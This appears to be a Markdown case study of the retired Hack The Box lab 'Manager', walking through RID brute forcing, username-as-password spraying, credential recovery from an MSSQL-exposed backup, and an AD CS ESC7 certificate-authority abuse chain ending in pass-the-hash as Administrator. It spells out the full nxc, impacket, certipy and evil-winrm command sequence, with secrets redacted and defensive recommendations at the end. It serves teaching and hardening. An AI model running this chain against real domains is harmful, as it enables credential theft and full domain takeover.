---
title: "Manager — AD CS ESC7 via Certificate Authority Abuse"
description: "RID brute forcing, password spraying, and a legacy backup expose ManageCA rights, enabling the AD CS ESC7 abuse chain to domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - esc7
  - credential-spray
  - mssql
---

## Summary

Manager is a Medium-rated Hack The Box Active Directory lab combining credential discovery with an Active Directory Certificate Services (AD CS) privilege-escalation path. RID brute forcing enumerates domain users, username-as-password spraying yields initial access, MSSQL filesystem access uncovers a legacy backup containing a second set of credentials, and the second account holds `ManageCA` rights enabling the ESC7 abuse chain — officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for full domain compromise. Passwords, hashes, IPs, and domain identifiers are redacted; command patterns and technique syntax are preserved.

## Context and Objective

- **Target:** Windows domain environment with a Domain Controller, MSSQL (port 1433), SMB (port 445), WinRM (port 5985), and AD CS
- **Starting position:** unauthenticated; no initial credential provided
- **Objective:** Enumerate users, obtain initial credentials, escalate to domain compromise through AD CS abuse
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: standard AD services plus MSSQL and WinRM. AD CS is present on the Domain Controller.

Action: version/script scan of the target.

```bash
nmap -sC -sV -p- -Pn -oA <OUT_PREFIX> <TARGET_IP> -T5
```

Representative excerpt (truncated):

```text
Domain: <DOMAIN>
MSSQL: 1433/tcp
SMB: 445/tcp
WinRM: 5985/tcp
AD CS present on dc01.<DOMAIN>
```

Technical significance: MSSQL provides filesystem-level access when authenticated; AD CS presence on the DC is the eventual escalation surface.

Result: the recorded output shows an AD domain with MSSQL, SMB, WinRM, and AD CS exposed.

### 2. User Enumeration and Credential Spray

Observation: null or guest SMB access is limited, but RID brute forcing recovers domain usernames.

Action: enumerate users via RID brute force, then spray each username as its own password.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' --rid-brute
```

Build a user list, then spray:

```bash
nxc smb <DOMAIN> -u <USERLIST> -p <USERLIST> --no-bruteforce --continue-on-success
```

Representative finding: one account accepts its own username as its password.

```text
<DOMAIN>\<OPERATOR_USER> : <OPERATOR_PASSWORD>
```

Technical significance: username-as-password spraying is a low-noise technique that avoids account lockout while exposing weak credential policy. The account obtained here is the entry point.

Result: the recorded output shows valid credentials for one domain account.

### 3. MSSQL Enumeration — Legacy Backup Discovery

Observation: the initial credential authenticates to MSSQL via Windows authentication.

Action: connect and enumerate the web root.

```bash
impacket-mssqlclient <DOMAIN>/<OPERATOR_USER>:<OPERATOR_PASSWORD>@<TARGET_IP> -windows-auth
```

Representative finding: an old website backup archive is present in the web root.

Inside the archive, a configuration file contains a second set of credentials for a different domain account.

```xml
<access-user>
  <user><SECOND_USER>@<DOMAIN></user>
  <password><SECOND_PASSWORD></password>
</access-user>
```

Technical significance: MSSQL filesystem access commonly exposes legacy backups, configuration files, and credential artifacts. The backup here contained an active credential for a higher-privileged account.

Result: the notes report a second credential pair recovered from the backup configuration.

### 4. BloodHound Collection — Mapping AD CS Rights

Action: collect domain objects and privilege edges using the second account.

```bash
bloodhound-ce-python \
  -d <DOMAIN> \
  -u '<SECOND_USER>' \
  -p '<SECOND_PASSWORD>' \
  -c all \
  -gc <DC_HOST>
```

Representative finding: the second account holds WinRM access and `ManageCA` rights over the Enterprise CA (`<CA_NAME>`). `ManageCA` permits CA officer assignment, template management, and certificate issuance.

Result: the recorded output shows the second account mapped to the CA with officer-level permissions.

### 5. Foothold — WinRM Login

Action: authenticate interactively over WinRM using the second account.

```bash
evil-winrm -i <TARGET_IP> -u '<SECOND_USER>' -p '<SECOND_PASSWORD>'
```

```text
*Evil-WinRM* PS C:\Users\<SECOND_USER>\Desktop>
```

Result: the notes report an interactive shell and the user flag (flag content omitted).

### 6. AD CS ESC7 — CA Officer and Template Abuse

Observation: the second account has `ManageCA` rights over the Enterprise CA. ESC7 exploits officer-level CA permissions to issue certificates for high-value accounts.

Action: enumerate vulnerable certificate paths.

```bash
certipy find \
  -dc-ip <TARGET_IP> \
  -u '<SECOND_USER>@<DOMAIN>' \
  -p '<SECOND_PASSWORD>' \
  -vulnerable -stdout -enable
```

Representative finding: ESC7 through CA officer and template manipulation.

Step 1 — Add the second account as a CA officer:

```bash
certipy ca \
  -ca '<CA_NAME>' \
  -add-officer <SECOND_USER> \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>'
```

Step 2 — Enable the `SubCA` template:

```bash
certipy ca \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -enable-template 'SubCA'
```

Step 3 — Request a SubCA certificate as Administrator. The request fails, but the request ID is created:

```bash
certipy req \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -template SubCA \
  -upn administrator@<DOMAIN>
```

Step 4 — Issue the failed request as a CA officer:

```bash
certipy ca \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -issue-request <REQUEST_ID>
```

Step 5 — Retrieve the issued certificate:

```bash
certipy req \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -retrieve <REQUEST_ID>
```

Step 6 — Authenticate with the retrieved certificate and recover the Administrator NT hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
```

```text
Got hash for 'administrator@<DOMAIN>':
<LM_HASH_REDACTED>:<NT_HASH_REDACTED>
```

Technical significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account. The certificate authenticates via PKINIT and exposes the NT hash, enabling pass-the-hash without cracking.

### 7. Full Compromise — Pass-the-Hash

Action: authenticate as Administrator using the recovered hash.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H '<NT_HASH_REDACTED>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Result: the notes report an Administrator session and the root flag (flag content omitted).

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| No initial credential | Used RID brute force and username-as-password spray | Low-noise approach avoids lockout while exposing weak credential policy |
| Second credential embedded in backup | Extracted from legacy XML config via MSSQL filesystem access | Old backups commonly contain active credentials; MSSQL access enabled discovery |
| ESC7 requires multiple steps | Assigned officer → enabled template → issued failed request → retrieved certificate | Each step builds on the previous; failed-request issuance is the critical non-obvious technique |

## Outcome

The evidence establishes: RID enumeration → credential spray → MSSQL backup discovery → WinRM foothold → BloodHound AD CS mapping → ESC7 CA officer abuse → certificate retrieval → NT-hash recovery → pass-the-hash Administrator. Passwords and hashes are source-reported with values omitted. The attack chain demonstrates that CA officer rights are equivalent to domain compromise when vulnerable templates exist.

**Attack chain:**
RID enumeration → username-as-password spray → MSSQL credential discovery → WinRM foothold → AD CS ESC7 (officer assignment → template enablement → failed-request issuance → certificate retrieval) → pass-the-hash Administrator

## Lessons and Recommendations

1. **Enforce strong credential policies.** Username-as-password spraying succeeds when accounts lack complexity requirements. Password policy enforcement and account lockout thresholds reduce spray success. (Lesson grounded in the initial spray.)
2. **Audit MSSQL filesystem access.** Authenticated MSSQL sessions expose the underlying filesystem. Old backups and configuration files containing credentials should be removed from accessible paths. (Lesson grounded in the backup discovery.)
3. **Restrict `ManageCA` rights.** CA officer permissions are powerful enough for full domain compromise through ESC7. Audit who holds officer rights and whether any non-admin account needs them. (Recommendation.)
4. **Monitor certificate issuance.** Failed-then-issued request sequences are abnormal. Alert on officer-level CA operations and template enablement for sensitive templates like `SubCA`. (Recommendation.)
5. **Remove legacy credentials from backups.** Configuration files embedded in backups are a common credential leak. Rotate credentials after any backup and audit backup contents before storage. (Lesson grounded in the XML credential discovery.)

## References

- Hack The Box machine **[Manager](https://app.hackthebox.com/machines/Manager)** (retired lab; no active-instance detail)
- AD CS ESC7 documentation and Certipy tool documentation
- `nxc`, `impacket-mssqlclient`, `bloodhound-ce-python`, `evil-winrm`, and `certipy` tool documentation
